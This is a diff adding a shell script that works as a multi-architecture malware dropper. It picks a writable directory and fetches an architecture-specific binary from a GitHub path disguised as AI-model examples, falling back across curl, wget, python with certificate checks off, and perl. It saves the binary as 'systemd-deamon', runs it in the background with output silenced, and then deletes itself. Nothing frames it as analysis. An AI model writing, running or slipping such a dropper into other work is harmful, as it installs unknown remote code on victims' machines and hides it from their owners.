@@ -1,0 +1,88 @@
+
+#!/bin/sh
+
+export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
+
+find_writable_dir() {
+    for dir in /dev/shm /tmp /var/tmp /usr/local/bin /usr/libexec /usr/bin; do
+        if [ -w "$dir" ] && [ -d "$dir" ]; then
+            test_file="$dir/.$$"
+            echo '#!/bin/sh' > "$test_file" 2>/dev/null
+            chmod +x "$test_file" 2>/dev/null
+            if "$test_file" 2>/dev/null; then
+                rm -f "$test_file"
+                echo "$dir"
+                return 0
+            fi
+            rm -f "$test_file" 2>/dev/null
+        fi
+    done
+    echo "/tmp"
+}
+
+WORK_DIR=$(find_writable_dir)
+cd "$WORK_DIR" || cd /tmp
+
+
+ARCH=$(uname -m)
+case "$ARCH" in
+    x86_64|amd64)   ARCH_TYPE="x64" ;;
+    i386|i686)      ARCH_TYPE="x86" ;;
+    aarch64|arm64)  ARCH_TYPE="arm64" ;;
+    armv7l|armv6l)  ARCH_TYPE="arm" ;;
+    mips|mipsel)    ARCH_TYPE="mips" ;;
+    *)              ARCH_TYPE="unknown" ;;
+esac
+
+BASE_URL="https://raw.githubusercontent.com/alipendj1111aoto1e/ai-model/main/examples/ai-e2e-next/bin/net/"
+PAYLOAD_NAME="net_${ARCH_TYPE}"
+DOWNLOAD_URL="${BASE_URL}/${PAYLOAD_NAME}"
+LOCAL_NAME="systemd-deamon"
+
+download_file() {
+    url="$1"
+    output="$2"
+
+    if command -v curl >/dev/null 2>&1; then
+        curl -fsSL -m180 --retry 3 "$url" -o "$output" 2>/dev/null && return 0
+    fi
+
+    if command -v wget >/dev/null 2>&1; then
+        wget -T180 --tries=3 -q "$url" -O "$output" 2>/dev/null && return 0
+    fi
+
+    if command -v python3 >/dev/null 2>&1; then
+        python3 -c "
+import urllib.request
+import ssl
+ctx = ssl._create_unverified_context()
+urllib.request.urlretrieve('$url', '$output', context=ctx)
+" 2>/dev/null && return 0
+    fi
+
+    if command -v python >/dev/null 2>&1; then
+        python -c "
+import urllib
+urllib.urlretrieve('$url', '$output')
+" 2>/dev/null && return 0
+    fi
+
+    if command -v perl >/dev/null 2>&1; then
+        perl -e "use LWP::Simple; getstore('$url', '$output');" 2>/dev/null && return 0
+    fi
+
+    return 1
+}
+
+rm -rf "$LOCAL_NAME"
+
+if download_file "$DOWNLOAD_URL" "$LOCAL_NAME"; then
+    chmod +x "$LOCAL_NAME"
+    if [ -f "$LOCAL_NAME" ] && [ -x "$LOCAL_NAME" ]; then
+        nohup ./"$LOCAL_NAME" >/dev/null 2>&1 </dev/null &
+    fi
+fi
+
+(sleep 5; rm -f "$0") &
+
+exit 0
